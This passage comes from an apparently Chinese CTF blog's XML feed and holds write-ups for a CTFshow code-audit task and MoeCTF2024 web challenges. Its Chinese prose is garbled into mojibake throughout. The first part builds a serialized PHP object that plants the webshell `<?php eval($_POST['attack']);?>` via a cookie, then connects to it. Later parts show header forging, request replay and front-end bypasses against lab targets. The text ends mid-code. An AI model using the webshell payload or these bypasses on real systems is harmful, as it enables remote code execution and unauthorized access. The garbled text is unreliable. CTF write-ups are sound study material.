variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">user</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;?php eval(\$_POST['attack']);?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>å› ä¸ºcookieä¸­å°†â€ä½œä¸ºæˆªæ–­ç¬¦å·ï¼Œæ‰€éœ€è¦ç¼–ç ç»•è¿‡ï¼Œè¿™é‡Œé‡‡ç”¨urlç¼–ç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>user<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>a<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A31<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">3</span>Fphp<span class="token operator">+</span><span class="token keyword">eval</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">24</span>_POST<span class="token operator">%</span><span class="token number">5</span>B<span class="token operator">%</span><span class="token number">27</span>attack<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">5</span>D<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">3</span>F<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D</code></pre><p>ç„¶åç”¨èšå‰‘è¿æ¥ï¼Œå› ä¸ºè´¦å·å¯†ç å·²ç»ç»™äº†ï¼Œæ‰€ä»¥ç›´æ¥è¿æ¥æ•°æ®åº“å°±è¡Œ(æ³¨æ„æœ¬åœ°ä¸‹è½½çš„sqlå¯†ç å’ŒçœŸæ­£çš„ä¸ä¸€æ ·)</p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MoeCTF2024-web</title>
      <link href="/2024/08/10/MoeCTF2024-web/"/>
      <url>/2024/08/10/MoeCTF2024-web/</url>
      
        <content type="html"><![CDATA[<h4 id="ProveYourLove"><a href="#ProveYourLove" class="headerlink" title="ProveYourLove"></a>ProveYourLove</h4><p><img src="ProveYourLove.png" loading="lazy"></p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML"># æºç &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;è¡¨ç™½å¢™&lt;&#x2F;title&gt;    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;    &lt;style&gt;        body &#123;            font-family: Arial, sans-serif;            margin: 20px;            padding: 0;            background-image: url(&#39;static&#x2F;image.jpg&#39;);            background-size: cover;            background-repeat: no-repeat;            background-position: center center;            color: #fff;        &#125;        .container &#123;            max-width: 600px;            margin: 0 auto;            background: rgba(0, 0, 0, 0.6); &#x2F;* åŠé€æ˜èƒŒæ™¯ *&#x2F;            padding: 20px;            border-radius: 8px;        &#125;        h1 &#123;            text-align: center;            margin-top: 0;        &#125;        form &#123;            margin-bottom: 20px;        &#125;        label &#123;            display: block;            margin-top: 10px;        &#125;        input[type&#x3D;&quot;text&quot;], textarea, select &#123;            width: calc(100% - 16px); &#x2F;* ç»Ÿä¸€å®½åº¦ï¼Œå‡å»å†…è¾¹è· *&#x2F;            padding: 8px;            margin-top: 5px;            border-radius: 4px;            border: 1px solid #ddd;            background-color: rgba(255, 255, 255, 0.2); &#x2F;* åŠé€æ˜èƒŒæ™¯ *&#x2F;            color: #fff;            box-sizing: border-box; &#x2F;* ç¡®ä¿å®½åº¦åŒ…æ‹¬å†…è¾¹è·å’Œè¾¹æ¡† *&#x2F;        &#125;        textarea &#123;            width: calc(100% - 16px); &#x2F;* ç¡®ä¿æ–‡æœ¬åŒºåŸŸå®½åº¦ä¸€è‡´ *&#x2F;        &#125;        input[type&#x3D;&quot;submit&quot;] &#123;            margin-top: 10px;            padding: 10px 20px;            font-size: 16px;            background-color: #4CAF50;            color: white;            border: none;            border-radius: 4px;            cursor: pointer;        &#125;        input[type&#x3D;&quot;submit&quot;]:hover &#123;            background-color: #45a049;        &#125;        .status &#123;            margin-top: 20px;            text-align: center;            font-size: 18px;        &#125;    &lt;&#x2F;style&gt;&lt;&#x2F;head&gt;&lt;body&gt;    &lt;div class&#x3D;&quot;container&quot;&gt;        &lt;h1&gt;è¡¨ç™½å¢™&lt;&#x2F;h1&gt;        &lt;form id&#x3D;&quot;confessionForm&quot;&gt;            &lt;label for&#x3D;&quot;nickname&quot;&gt;æ˜µç§°:&lt;&#x2F;label&gt;            &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;nickname&quot; name&#x3D;&quot;nickname&quot; required placeholder&#x3D;&quot;è¾“å…¥æ‚¨çš„æ˜µç§°&quot;&gt;            &lt;label for&#x3D;&quot;user_gender&quot;&gt;æ‚¨çš„æ€§åˆ«:&lt;&#x2F;label&gt;            &lt;select id&#x3D;&quot;user_gender&quot; name&#x3D;&quot;user_gender&quot; required&gt;                &lt;option value&#x3D;&quot;male&quot;&gt;ç”·&lt;&#x2F;option&gt;                &lt;option value&#x3D;&quot;female&quot;&gt;å¥³&lt;&#x2F;option&gt;                &lt;option value&#x3D;&quot;other&quot;&gt;å…¶ä»–&lt;&#x2F;option&gt;            &lt;&#x2F;select&gt;            &lt;label for&#x3D;&quot;target&quot;&gt;è¡¨ç™½å¯¹è±¡:&lt;&#x2F;label&gt;            &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;target&quot; name&#x3D;&quot;target&quot; required placeholder&#x3D;&quot;è¾“å…¥æ‚¨è¡¨ç™½çš„å¯¹è±¡&quot;&gt;            &lt;label for&#x3D;&quot;target_gender&quot;&gt;è¡¨ç™½å¯¹è±¡çš„æ€§åˆ«:&lt;&#x2F;label&gt;            &lt;select id&#x3D;&quot;target_gender&quot; name&#x3D;&quot;target_gender&quot; required&gt;                &lt;option value&#x3D;&quot;male&quot;&gt;ç”·&lt;&#x2F;option&gt;                &lt;option value&#x3D;&quot;female&quot;&gt;å¥³&lt;&#x2F;option&gt;                &lt;option value&#x3D;&quot;other&quot;&gt;å…¶ä»–&lt;&#x2F;option&gt;            &lt;&#x2F;select&gt;            &lt;label for&#x3D;&quot;message&quot;&gt;è¡¨ç™½å†…å®¹:&lt;&#x2F;label&gt;            &lt;textarea id&#x3D;&quot;message&quot; name&#x3D;&quot;message&quot; rows&#x3D;&quot;6&quot; required placeholder&#x3D;&quot;è¾“å…¥æ‚¨çš„è¡¨ç™½å†…å®¹&quot;&gt;&lt;&#x2F;textarea&gt;            &lt;label for&#x3D;&quot;anonymous&quot;&gt;æ˜¯å¦åŒ¿å:&lt;&#x2F;label&gt;            &lt;select id&#x3D;&quot;anonymous&quot; name&#x3D;&quot;anonymous&quot; required&gt;                &lt;option value&#x3D;&quot;false&quot;&gt;ä¸åŒ¿å&lt;&#x2F;option&gt;                &lt;option value&#x3D;&quot;true&quot;&gt;åŒ¿å&lt;&#x2F;option&gt;            &lt;&#x2F;select&gt;            &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;æäº¤è¡¨ç™½&quot;&gt;        &lt;&#x2F;form&gt;        &lt;div class&#x3D;&quot;status&quot;&gt;            å½“å‰è¡¨ç™½ä»½æ•°: &lt;span id&#x3D;&quot;confessionCount&quot;&gt;åŠ è½½ä¸­...&lt;&#x2F;span&gt;&lt;br&gt;            flag: &lt;span id&#x3D;&quot;flag&quot;&gt;è®¿é—®confession_countè·å–&lt;&#x2F;span&gt;&lt;br&gt;            Qixi_flag: &lt;span id&#x3D;&quot;Qixi_flag&quot;&gt;è®¿é—®questionnaire_countè·å–&lt;&#x2F;span&gt;        &lt;&#x2F;div&gt;    &lt;&#x2F;div&gt;    &lt;script&gt;        document.addEventListener(&#39;DOMContentLoaded&#39;, function() &#123;            &#x2F;&#x2F; è·å–å½“å‰è¡¨ç™½ä»½æ•°            fetch(&#39;&#x2F;confession_count&#39;)                .then(response &#x3D;&gt; response.json())                .then(data &#x3D;&gt; &#123;                    document.getElementById(&#39;confessionCount&#39;).textContent &#x3D; data.count;                    document.getElementById(&#39;flag&#39;).textContent &#x3D; data.flag;                    document.getElementById(&#39;Qixi_flag&#39;).textContent &#x3D; data.Qixi_flag;                &#125;)                .catch(error &#x3D;&gt; &#123;                    console.error(&#39;Error:&#39;, error);                &#125;);        &#125;);        document.getElementById(&#39;confessionForm&#39;).addEventListener(&#39;submit&#39;, function(event) &#123;            event.preventDefault(); &#x2F;&#x2F; é˜»æ­¢è¡¨å•çš„é»˜è®¤æäº¤è¡Œä¸º            &#x2F;&#x2F; æ£€æŸ¥è®¾å¤‡æ˜¯å¦å·²æäº¤è¿‡è¡¨ç™½            if (localStorage.getItem(&#39;confessionSubmitted&#39;)) &#123;                alert(&#39;æ‚¨å·²ç»æäº¤è¿‡è¡¨ç™½ï¼Œä¸èƒ½é‡å¤æäº¤ã€‚&#39;);                return;            &#125;            &#x2F;&#x2F; å‘èµ· OPTIONS è¯·æ±‚            fetch(&#39;&#x2F;questionnaire&#39;, &#123;                method: &#39;OPTIONS&#39;            &#125;)            .then(response &#x3D;&gt; &#123;                if (!response.ok) &#123;                    throw new Error(&#39;OPTIONS è¯·æ±‚å¤±è´¥&#39;);                &#125;                &#x2F;&#x2F; è·å–è¡¨å•æ•°æ®                const formData &#x3D; new FormData(event.target);                const data &#x3D; &#123;&#125;;                formData.forEach((value, key) &#x3D;&gt; &#123;                    data[key] &#x3D; value;                &#125;);                &#x2F;&#x2F; æäº¤è¡¨ç™½æ•°æ®                return fetch(&#39;&#x2F;questionnaire&#39;, &#123;                    method: &#39;POST&#39;,                    headers: &#123;                        &#39;Content-Type&#39;: &#39;application&#x2F;json&#39;                    &#125;,                    body: JSON.stringify(data)                &#125;);            &#125;)            .then(response &#x3D;&gt; response.json())            .then(result &#x3D;&gt; &#123;                if (result.success) &#123;                    alert(&#39;è¡¨ç™½æäº¤æˆåŠŸï¼&#39;);                    localStorage.setItem(&#39;confessionSubmitted&#39;, &#39;true&#39;);                    &#x2F;&#x2F; æ›´æ–°è¡¨ç™½ä»½æ•°                    fetch(&#39;&#x2F;confession_count&#39;)                        .then(response &#x3D;&gt; response.json())                        .then(data &#x3D;&gt; &#123;                            document.getElementById(&#39;confessionCount&#39;).textContent &#x3D; data.count;                            document.getElementById(&#39;flag&#39;).textContent &#x3D; data.flag;                            document.getElementById(&#39;Qixi_flag&#39;).textContent &#x3D; data.Qixi_flag;                        &#125;)                        .catch(error &#x3D;&gt; &#123;                            console.error(&#39;Error:&#39;, error);                        &#125;);                &#125; else &#123;                    alert(&#39;è¡¨ç™½æäº¤å¤±è´¥ï¼Œè¯·ç¨åé‡è¯•ã€‚&#39;);                &#125;            &#125;)            .catch(error &#x3D;&gt; &#123;                console.error(&#39;Error:&#39;, error);            &#125;);        &#125;);    &lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><p>é¢˜ç›®ç»™äº†Hintï¼Œå¿…é¡»å‘é€300æ¬¡æ‰å¯ä»¥å¾—åˆ°flag</p><p>é—®é¢˜åœ¨äºï¼Œæ¯æ¬¡å‘é€åä¼šåœ¨æœ¬åœ°å‚¨å­˜<code>confessionSubmitted=true</code>è¿™æ ·çš„è¯ç¬¬äºŒæ¬¡å‚¨å­˜å°±ä¼šä¸å…è®¸å‘é€</p><p>äºæ˜¯åªè¦åœ¨å‘èµ·è¯·æ±‚çš„æ—¶å€™åŠ ä¸Š <code>Cache-Control: no-store</code>æ¥é˜»æ­¢è¿›è¡Œæœ¬åœ°å‚¨å­˜ï¼Œä½¿ç”¨burpå‘é€300éå³å¯å¾—åˆ°flag</p><pre class="language-markup" data-language="markup"><code class="language-markup">å½“å‰è¡¨ç™½ä»½æ•°: 329flag: moectf&#123;c0NgRaTuL@tioNs-ON-6EC0M1Ng-4-Lick1NG_dOG48&#125;Qixi_flag: moeCTF&#123;Happy_Chin3s3_Va13ntin3's_Day,_Baby.&#125;</code></pre><h4 id="å¼—æ‹‰æ ¼ä¹‹åœ°çš„æŒ‘æˆ˜"><a href="#å¼—æ‹‰æ ¼ä¹‹åœ°çš„æŒ‘æˆ˜" class="headerlink" title="å¼—æ‹‰æ ¼ä¹‹åœ°çš„æŒ‘æˆ˜"></a>å¼—æ‹‰æ ¼ä¹‹åœ°çš„æŒ‘æˆ˜</h4><p> <strong>web ä¸ƒé¾™ç </strong></p><p>æ¬¢è¿æ¥åˆ°å¼—æ‹‰æ ¼ä¹‹åœ°è¿›è¡Œ web ä¸ƒé¾™ç è¯•ç‚¼</p><p>åœ¨è¿™é‡Œï¼Œä½ å°†æ ¹æ®å¼•å¯¼ï¼Œå®Œæˆæ•°ä¸ªä»»åŠ¡ï¼Œä»è€Œè·å¾—åä¸º flag çš„ä¸œè¥¿</p><p>æœ¬æ¬¡æˆ‘ä»¬é‡‡ç”¨ä¸€ä¸ªå«åšåˆ†æ®µ flag çš„ä¸œè¥¿ï¼Œå°† flag åˆ†ä¸ºä¸ƒé¢—é¾™ç ï¼Œé›†é½ä¸ƒé¢—é¾™ç å°±å¯ä»¥è·å¾—æœ€ç»ˆçš„ flag</p><p>åœ¨è¿™æ¬¡æŒ‘æˆ˜ä¸­ï¼Œè¯·éšæ—¶å‡†å¤‡å¥½ä½ çš„è®°äº‹æœ¬å“¦</p><p>ç°åœ¨æˆ‘ä»¬å¼€å§‹ï¼Œæç¤ºåœ¨ä¸‹é¢ â†“</p><p>&#x2F;flag1ab.html</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>flag1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>è‡³å°‘ä½ ä¼šè·³è½¬ url (bushi<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>ç°åœ¨æ˜¯ç¬¬ä¸€é“é¢˜ï¼Œæˆ‘ä»¬å­¦ä¹ çš„æ˜¯ï¼š html <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>è¿™è¡Œå­—çš„ä¸‹é¢ä¸€ç‰‡ç©ºç™½ï¼Œä½†æ˜¯çœŸçš„ä»€ä¹ˆä¹Ÿæ²¡æœ‰å—ï¼Ÿ<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--æ­å–œä½ æ‰¾åˆ°äº†ç½‘é¡µçš„æºä»£ç ï¼Œé€šå¸¸åœ¨è¿™é‡Œé¢˜ç›®ä¼šæ”¾ä¸€äº›æç¤ºï¼Œåšé¢˜æ²¡å¤´ç»ªä¸€å®šè¦å…ˆè¿›æ¥çœ‹ä¸€ä¸‹--></span><span class="token comment">&lt;!--flag1: bW9lY3Rm--></span><span class="token comment">&lt;!--ä¸‹ä¸€æ­¥ï¼š/flag2hh.php--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>æ­å–œä½ å·²ç»å­¦ä¼šäº†å¦‚ä½•æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œä½†è¿™è¿˜ä¸å¤Ÿ</p><p>è¿™æ˜¯ç¬¬äºŒé¢˜ï¼Œæœ¬é¢˜å…³é”®è¯ï¼š http </p><p>æƒ³æƒ³æœåŠ¡å™¨é€šè¿‡ç½‘ç»œä¼ è¾“è¿‡æ¥çš„ï¼Œé™¤äº†è¿™ä¸ªé¡µé¢ï¼Œè¿˜æœ‰ä»€ä¹ˆï¼Ÿ</p><pre class="language-http" data-language="http"><code class="language-http"># æŠ“åŒ…<span class="token header"><span class="token header-name keyword">flag2</span><span class="token punctuation">:</span> <span class="token header-value">e0FmdEV</span></span><span class="token header"><span class="token header-name keyword">nextpage</span><span class="token punctuation">:</span> <span class="token header-value">/flag3cad.php</span></span></code></pre><p>æˆ‘æƒ³ï¼Œä½ åº”è¯¥å·²ç»çŸ¥é“ devtools è¿™ä¸ªä¸œè¥¿äº†ã€‚(ä¸çŸ¥é“ä¹Ÿæ²¡å…³ç³»ï¼Œä½  f12 å‡ºæ¥çš„å°±æ˜¯ devtools)</p><p>é‚£ä¹ˆç°åœ¨åœ¨ä½ é¢å‰çš„æœ‰ä¸¤ä¸ªæ•™ç¨‹ï¼š</p><p>\1. å°è¯•æŠŠ devtools è¿ç”¨ç†Ÿç»ƒ</p><p>\2. å°è¯•ä¸‹è½½ä¸€ä¸ªåˆ«çš„ä»€ä¹ˆç©æ„æ¥ä½¿ç”¨</p><p>è¿™é¢˜ï¼Œæˆ‘ä»¬è¿˜æ˜¯å­¦ä¹  http</p><p>é‚£ä¹ˆï¼Œæˆ‘ä»¬æ¥è¯•ä¸€ä¸‹åŒæ—¶æŠŠä¸‹é¢è¦æ±‚å®Œæˆå§ï¼</p><p>-â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“</p><p>è¯·ç”¨ GET æ–¹æ³•ä¼ å…¥ä¸€ä¸ª a å‚æ•°<br>å†ç”¨ POST æ–¹æ³•ä¼ å…¥ä¸€ä¸ª b å‚æ•°<br>ä½ éœ€è¦ä½¿ç”¨ admin çš„èº«ä»½éªŒè¯</p><pre class="language-markup" data-language="markup"><code class="language-markup">æ­å–œä½ å·²ç»åŸºæœ¬æŒæ¡äº† http çš„æœ€æœ€æœ€åŸºç¡€çŸ¥è¯†ï¼Œå…ˆå»ä¸‹ä¸€å…³å§flag3: yX3RoMXN</code></pre><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/flag3cad.php?a=1</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:8846</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">DNT</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">verify=admin</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">3</span></span>b=1</code></pre><p>è™½ç„¶ä½†æ˜¯ï¼Œå“åº”å¤´æœ‰ä¸ª<code>fxxk: /flag3.php</code></p><p>å•Šï¼Ÿéš¾é“ä½ ä¸æ˜¯ä» <a href="http://localhost:8080/flag3cad.php?a=1">http://localhost:8080/flag3cad.php?a=1</a> ç‚¹å‡»é“¾æ¥è¿‡æ¥çš„å—ï¼Ÿ<br>åäº†ï¼Œè‚¯å®šæ˜¯å“ªé‡Œæé”™äº†ï¼Œè¦ä¸ä½ çœ‹çœ‹èƒ½ä¸èƒ½è‡ªå·±ä¸´æ—¶å‡‘åˆå‡‘åˆï¼Ÿ</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://localhost:8080/flag3cad.php?a=1</span></span></code></pre><p><img src="7ball_3.png" loading="lazy"></p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;head&gt;    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;    &lt;title&gt;flag4&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;ok, ä½ æˆåŠŸé—¯å…¥äº†ç¬¬å››å…³ï¼&lt;br&gt;æœ¬å…³è€ƒéªŒä½ å¬å£°è¾©ä½çš„åŠŸå¤«ï¼Œä½ éœ€è¦æŒ‰ä¸‹å¼€å§‹æŒ‰é’®åï¼Œæ ¹æ®æç¤ºæŒ‰ä¸‹ç›¸åº”çš„æŒ‰é’®ã€‚&lt;br&gt;&lt;button onclick&#x3D;&quot;start()&quot;&gt;å¼€å§‹&lt;&#x2F;button&gt;&lt;span id&#x3D;&quot;num&quot;&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;div id&#x3D;&quot;scope&quot;&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;1&lt;&#x2F;button&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;2&lt;&#x2F;button&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;3&lt;&#x2F;button&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;4&lt;&#x2F;button&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;5&lt;&#x2F;button&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;6&lt;&#x2F;button&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;7&lt;&#x2F;button&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;8&lt;&#x2F;button&gt;&lt;&#x2F;div&gt;&lt;script&gt;    var buttons &#x3D; document.getElementById(&quot;scope&quot;).getElementsByTagName(&quot;button&quot;);    for (var i &#x3D; 0; i &lt; buttons.length; i++) &#123;        buttons[i].id &#x3D; i + 1;    &#125;    function start() &#123;        document.getElementById(&quot;num&quot;).innerText &#x3D; &quot;9&quot;;    &#125;    function getID(button) &#123;        if (button.id &#x3D;&#x3D; 9) &#123;            alert(&quot;ä½ è¿‡å…³ï¼ï¼ˆé“œäººéœ‡å£°ï¼‰\næˆ‘ä»¬ä½¿ç”¨ console.log æ¥ä¸ºä½ ç”Ÿæˆ flag&quot;);            fetch(&#39;flag4bbc.php&#39;, &#123;                method: &#39;post&#39;,                body: &#39;method&#x3D;get&#39;,                headers: &#123;                    &#39;Content-Type&#39;: &#39;application&#x2F;x-www-form-urlencoded&#39;,                &#125;,            &#125;).then((data) &#x3D;&gt; &#123;                return data.json();            &#125;).then((result) &#x3D;&gt; &#123;console.log(result.hint);                console.log(result.fll);                console.log(result.goto)            &#125;);        &#125; else &#123;            alert(&quot;è¯¥ç½šï¼(å¤´éƒ¨ç¢°æ’å£°)&quot;)        &#125;    &#125;&lt;&#x2F;script&gt;</code></pre><p>æ·»åŠ ä¸€ä¸ªbuttonå³å¯</p><pre class="language-markup" data-language="markup"><code class="language-markup">æ­å–œä½ ï¼ä½ å·²ç»çŸ¥é“ï¼Œå‰ç«¯çš„ä¸€åˆ‡éƒ½æ˜¯å¯ä»¥æ›´æ”¹çš„ï¼ flag4: fdFVUMHJå‰å¾€ï¼š/flag5sxr.php</code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token keyword">function</span> <span class="token function">checkValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> content <span class="token operator">=</span> document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token string">"form"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"content"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>content <span class="token operator">==</span> <span class="token string">"I want flag"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"ä½ å°±è¿™ä¹ˆç›´æ¥ï¼Ÿ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>burpæŠ“åŒ…å‘é€</p><pre class="language-markup" data-language="markup"><code class="language-markup">æ­å–œï¼Œæˆ‘ç›¸ä¿¡ä½ å·²ç»æ·±åˆ»äº†è§£äº†å‰ç«¯ä¸å¯ä¿¡ä»»çš„é“ç†!flag5: fSV90aDF</code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag6diw.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'moe'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'moe'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'moe'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'moe'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"flag6: xxx"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token 